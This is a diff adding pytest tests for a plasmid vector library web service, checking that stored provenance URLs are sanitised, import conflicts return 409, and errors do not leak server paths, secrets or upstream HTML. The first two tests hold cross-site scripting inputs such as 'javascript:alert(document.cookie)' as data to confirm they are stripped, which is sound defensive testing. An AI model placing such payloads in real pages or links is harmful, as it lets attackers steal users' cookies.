+def test_provenance_url_sanitized_on_read(client, vectors_dir):
+    """手改 YAML / 旧版本写入的 javascript: 链接：读取时丢弃，不下发给前端"""
+    (vectors_dir / "evil.yaml").write_text(
+        "id: evil_vec\nname: evil\nsequence: ACGTACGTACGT\n"
+        "data_provenance:\n  source: x\n  url: \"javascript:alert(document.cookie)\"\n"
+        "  map_url: \"data:text/html,x\"\n  doc_url: \"https://example.org/doc\"\n"
+        "features:\n- name: f\n  type: CDS\n  start: 1\n  end: 3\n", encoding="utf-8")
+    v = _load_vector(vectors_dir, "evil_vec")
+    assert v is not None and v.provenance == {"source": "x", "doc_url": "https://example.org/doc"}
+    from app.design_service import invalidate_vector_library_cache
+    invalidate_vector_library_cache()
+    c, _ = client
+    d = c.get("/api/vectors/evil_vec")
+    assert d.status_code == 200, d.text
+    assert "url" not in d.json()["data_provenance"]
+    assert "javascript" not in d.text
+
+
+def test_save_record_drops_non_http_urls(tmp_path):
+    from app.vector_import import provenance_block, record_from_parts, save_record
+    rec = record_from_parts(name="direct", sequence=SEQ300)
+    res = save_record(rec, source="x", vectors_dir=str(tmp_path), url="javascript:alert(1)",
+                      provenance=provenance_block("t", url="javascript:alert(1)",
+                                                  page_url="https://ok.example/p"))
+    assert res["url"] == "" and "url" not in res["provenance"]
+    assert res["provenance"]["page_url"] == "https://ok.example/p"
+    text = next(tmp_path.glob("*.yaml")).read_text(encoding="utf-8")
+    assert "javascript" not in text
+
+
+# ================================================================ 低优先级修复（审查 L1–L7）
+
+@pytest.mark.parametrize("raw,expected", [
+    ("polyA_signal", "regulatory"), ("polya_signal", "regulatory"), ("POLYA_SIGNAL", "regulatory"),
+    ("rep_origin", "origin"), ("Rep_Origin", "origin"), ("mcs", "multiple_cloning_site"),
+])
+def test_type_aliases_case_insensitive(raw, expected):
+    """L1：别名表键大写时 .lower() 查表永远命不中（polyA_signal 落成 other）"""
+    from core.vector_library import VectorLibrary
+    v = VectorLibrary()._parse_vector_dict({
+        "id": "t", "name": "t", "sequence": "ACGT" * 10,
+        "features": [{"name": "f", "type": raw, "start": 1, "end": 4}]})
+    assert v.elements[0].element_type.value == expected
+
+
+def _rec(name="v", seq=SEQ300):
+    from app.vector_import import record_from_parts
+    return record_from_parts(name=name, sequence=seq)
+
+
+def test_save_record_refuses_to_overwrite_other_vector(tmp_path):
+    """L2：文件名撞车（不同 ID 归一到同一文件）→ 409，原文件保持不变"""
+    from app.vector_import import VectorIdConflict, save_record
+    (tmp_path / "snapgene_A_B.yaml").write_text(
+        "id: someone_else\nname: x\nsequence: ACGT\nfeatures: []\n", encoding="utf-8")
+    with pytest.raises(VectorIdConflict) as ei:
+        save_record(_rec(), source="snapgene", vectors_dir=str(tmp_path), vector_id="snapgene_A B")
+    assert ei.value.status_code == 409 and "someone_else" in ei.value.detail
+    assert "someone_else" in (tmp_path / "snapgene_A_B.yaml").read_text(encoding="utf-8")
+
+    # 读不出 id 的文件同样不覆盖
+    (tmp_path / "x_bad.yaml").write_text("{ not yaml", encoding="utf-8")
+    with pytest.raises(VectorIdConflict):
+        save_record(_rec(), source="x", vectors_dir=str(tmp_path), vector_id="x_bad")
+
+
+def test_save_record_same_id_overwrite_is_reported(tmp_path):
+    """同一 ID 再次导入：允许覆盖（更新），但回执与告警写明 replaced"""
+    from app.vector_import import save_record
+    first = save_record(_rec(), source="snapgene", vectors_dir=str(tmp_path),
+                        vector_id="snapgene_SARS Genome")
+    assert first["id"] == "snapgene_SARS_Genome"          # ID 与文件名同一套归一
+    assert first["replaced"] is False
+    again = save_record(_rec(seq=SEQ300[:200]), source="snapgene", vectors_dir=str(tmp_path),
+                        vector_id="snapgene_SARS_Genome")
+    assert again["replaced"] is True and any("覆盖" in w for w in again["warnings"])
+    v = _load_vector(tmp_path, "snapgene_SARS_Genome")
+    assert v is not None and len(v.sequence) == 200
+
+
+def test_from_map_conflict_returns_409(client, vectors_dir):
+    (vectors_dir / "paste_clash.yaml").write_text(
+        "id: other\nname: o\nsequence: ACGT\nfeatures: []\n", encoding="utf-8")
+    c, _ = client
+    r = c.post("/api/vectors/import/from-map", json=dict(_MAP_PAYLOAD, name="clash"),
+               headers=_admin())
+    assert r.status_code == 409 and "other" in r.json()["detail"]
+
+
+def test_ncbi_and_batch_import_paths_write_topology(tmp_path):
+    """L3：NCBI / 批量 GenBank 导入写出 LOCUS 行的真实拓扑（此前线性记录被画成环状）"""
+    from core.external_vector_importer import (GenBankImporter, NCBIClient,
+                                               VectorLibraryManager, locus_topology)
+    lin, circ = _gbk(topology="linear", name="LINFRAG").decode(), _gbk(name="CIRCP").decode()
+    assert locus_topology(lin) == "linear" and locus_topology(circ) == "circular"
+    assert locus_topology("no locus here") == "circular"
+
+    manager = VectorLibraryManager()
+    v1 = NCBIClient()._parse_genbank_response(lin, "AB000001")
+    v2 = GenBankImporter()._parse_genbank(circ)
+    assert v1.topology == "linear" and v2.topology == "circular"
+    manager.vectors = {v1.id: v1, v2.id: v2}
+    assert manager.export_to_yaml(str(tmp_path)) == 2
+    assert _load_vector(tmp_path, "ncbi_AB000001").topology == "linear"
+    assert _load_vector(tmp_path, "genbank_CIRCP").topology == "circular"
+
+
+def test_addgene_local_index_cached_until_file_changes(tmp_path, monkeypatch):
+    """L4：17 万条索引不再每次请求整读，按 mtime/大小失效"""
+    import os
+    monkeypatch.setattr(src, "_addgene_index_cache", {})
+    reads = []
+    real = src._read_addgene_index
+
+    def _counting(path):
+        reads.append(path)
+        return real(path)
+    monkeypatch.setattr(src, "_read_addgene_index", _counting)
+
+    idx = tmp_path / "addgeneProcessed.json"
+    idx.write_text(json.dumps([{"id": 52961, "name": "lentiCRISPR v2"}, "junk"]), encoding="utf-8")
+    p = str(idx)
+    assert [e["id"] for e in src.addgene_local_index("lenti", index_path=p)] == [52961]
+    assert [e["id"] for e in src.addgene_local_index("52961", index_path=p)] == [52961]
+    assert len(reads) == 1
+
+    idx.write_text(json.dumps([{"id": 1, "name": "pNEW lenti"}]), encoding="utf-8")
+    st = os.stat(p)
+    os.utime(p, ns=(st.st_atime_ns, st.st_mtime_ns + 5_000_000_000))
+    assert [e["id"] for e in src.addgene_local_index("lenti", index_path=p)] == [1]
+    assert len(reads) == 2
+
+    idx.write_text("{ broken", encoding="utf-8")
+    os.utime(p, ns=(st.st_atime_ns, st.st_mtime_ns + 9_000_000_000))
+    assert src.addgene_local_index("lenti", index_path=p) == []
+
+
+def test_upload_enforces_length_and_hides_server_path(client, vectors_dir, monkeypatch):
+    """L5：上传解析按 MAP_MAX_LENGTH 限长；回执不暴露服务器绝对路径"""
+    from app.routes import vector_routes
+    c, _ = client
+    monkeypatch.setattr(vector_routes, "MAP_MAX_LENGTH", 100)
+    r = c.post("/api/vectors/import/upload",
+               files={"file": ("big.fasta", f">big\n{SEQ300}\n".encode(), "text/plain")},
+               headers=_admin())
+    assert r.status_code == 413, r.text
+    assert list(vectors_dir.iterdir()) == []
+
+    monkeypatch.setattr(vector_routes, "MAP_MAX_LENGTH", 10_000)
+    ok = c.post("/api/vectors/import/upload",
+                files={"file": ("ok.fasta", f">ok\n{SEQ300}\n".encode(), "text/plain")},
+                headers=_admin())
+    assert ok.status_code == 200, ok.text
+    assert str(vectors_dir) not in ok.text and "path" not in ok.json()["vector"]
+    # 其他落库端点（另存为载体）同样不带路径
+    fm = c.post("/api/vectors/import/from-map", json=dict(_MAP_PAYLOAD, name="noPath"),
+                headers=_admin())
+    assert fm.status_code == 200 and "path" not in fm.json()["vector"]
+    assert str(vectors_dir) not in fm.text
+
+
+def test_upload_unexpected_errors_are_generic(client, vectors_dir, monkeypatch):
+    import core.plasmid_map.parsers as parsers
+    from app import vector_import
+    c, _ = client
+    real_parse = parsers.parse_file
+
+    def _parse_boom(*a, **k):
+        raise RuntimeError("secret internal /srv/path")
+    monkeypatch.setattr(parsers, "parse_file", _parse_boom)
+    r = c.post("/api/vectors/import/upload",
+               files={"file": ("x.fasta", f">x\n{SEQ300}\n".encode(), "text/plain")},
+               headers=_admin())
+    assert r.status_code == 400 and "secret" not in r.text
+    monkeypatch.setattr(parsers, "parse_file", real_parse)
+
+    def _save_boom(*a, **k):
+        raise OSError(f"disk full at {vectors_dir}")
+    monkeypatch.setattr(vector_import, "save_record", _save_boom)
+    r2 = c.post("/api/vectors/import/upload",
+                files={"file": ("x.fasta", f">x\n{SEQ300}\n".encode(), "text/plain")},
+                headers=_admin())
+    assert r2.status_code == 500 and str(vectors_dir) not in r2.text
+
+
+def test_errors_do_not_echo_upstream_bytes():
+    """L6：非 .dna 响应（如登录页 HTML）不回显进错误详情"""
+    page = b"<html><body>Login required; csrftoken=abc123</body></html>"
+    with pytest.raises(MapParseError) as ei:
+        src.assert_snapgene_dna(page, "x/y")
+    assert ei.value.status == 415
+    assert "csrftoken" not in str(ei.value) and "<html" not in str(ei.value)
+
+
+def test_sources_payload_strips_base_userinfo(client, monkeypatch):
+    monkeypatch.setattr(src, "ENSEMBL_BASE", "https://user:s3cret@proxy.example:8443/ensembl")
+    monkeypatch.setattr(src, "UNIPROT_BASE", "https://rest.uniprot.org")
+    c, _ = client
+    body = c.get("/api/map/import/sources")
+    assert body.status_code == 200 and "s3cret" not in body.text and "user:" not in body.text
+    ids = {s["id"]: s for s in body.json()["sources"]}
+    assert ids["ensembl"]["url"] == "https://proxy.example:8443/ensembl"
+    assert ids["uniprot"]["url"] == "https://rest.uniprot.org"
